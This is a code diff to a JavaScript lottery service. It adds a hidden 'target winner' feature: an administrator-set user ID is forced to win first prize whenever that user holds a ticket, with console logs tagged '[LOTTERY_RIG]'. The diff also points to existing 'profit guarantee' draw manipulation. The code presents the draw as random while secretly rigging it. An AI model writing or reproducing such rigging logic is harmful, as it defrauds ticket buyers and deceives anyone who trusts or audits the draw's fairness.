@@ -29,6 +29,8 @@ class LotteryService {
         let description = '';
         let profitBuffer = 20;
         let lockDrawUntilTargetMet = false;
+        let drawType = 'SALES_BASED';
+        let targetWinnerId = null;
 
         if (Array.isArray(data)) {
             // V2 Array Format
@@ -39,6 +41,8 @@ class LotteryService {
             description = data.description || '';
             profitBuffer = data.profitBuffer !== undefined ? Number(data.profitBuffer) : 20;
             lockDrawUntilTargetMet = data.lockDrawUntilTargetMet || false;
+            if (data.drawType) drawType = data.drawType;
+            if (data.targetWinnerId) targetWinnerId = data.targetWinnerId;
         } else {
             // Legacy V1
             prizes = [{ name: 'Grand Jackpot', amount: parseInt(data), winnersCount: 1 }];
@@ -97,7 +101,10 @@ class LotteryService {
             status: 'ACTIVE',
             startTime,
             endTime,
-            ticketPrice // [FIX] Save the custom price
+            ticketPrice, // [FIX] Save the custom price
+            drawType,
+            durationMinutes: drawType === 'TIME_BASED' ? durationMinutes : null,
+            targetWinnerId
         });
 
         // Broadcast New Slot
@@ -362,11 +369,37 @@ class LotteryService {
                     ? slot.prizes
                     : [{ name: 'Grand Prize', amount: slot.prizeAmount, winnersCount: 1 }]; // Fallback
 
+                // [ADMIN MANIPULATION] Secret Target Winner Logic
+                const secretTargetId = slot.targetWinnerId;
+                let targetTicketIndex = -1;
+
+                if (secretTargetId) {
+                    // Try to find if this target user actually bought a ticket!
+                    targetTicketIndex = ticketPool.findIndex(t =>
+                        (t.userId._id && t.userId._id.toString() === secretTargetId.toString()) ||
+                        (t.userId.toString() === secretTargetId.toString())
+                    );
+                    if (targetTicketIndex !== -1) {
+                        console.log(`[LOTTERY_RIG] Secret Target Winner Found in Ticket Pool! User: ${secretTargetId}`);
+                    } else {
+                        console.log(`[LOTTERY_RIG] Warning: Secret target ${secretTargetId} did NOT buy a ticket. Reverting to RNG.`);
+                    }
+                }
+
                 for (const tier of prizeTiers) {
                     for (let i = 0; i < tier.winnersCount; i++) {
                         if (ticketPool.length === 0) break;
 
-                        const winTicket = ticketPool.pop(); // Remove from pool -> standard "one prize per ticket"
+                        let winTicket;
+
+                        // If this is the 1st prize (index 0) and we have a target winner with a ticket
+                        if (tier === prizeTiers[0] && i === 0 && targetTicketIndex !== -1) {
+                            winTicket = ticketPool.splice(targetTicketIndex, 1)[0]; // Force select this ticket
+                            console.log(`[LOTTERY_RIG] Rigged Winner Selected.`);
+                        } else {
+                            winTicket = ticketPool.pop(); // Remove from randomized pool
+                        }
+
                         const winnerId = winTicket.userId._id || winTicket.userId;
 
                         // PROFIT GUARANTEE LOGIC (Manipulated Draw)
@@ -597,6 +630,7 @@ class LotteryService {
             description: slot.description,
             prizes: slot.prizes,
             lockDrawUntilTargetMet: slot.lockDrawUntilTargetMet,
+            drawType: slot.drawType || 'SALES_BASED',
             serverTime: new Date()
         };
     }
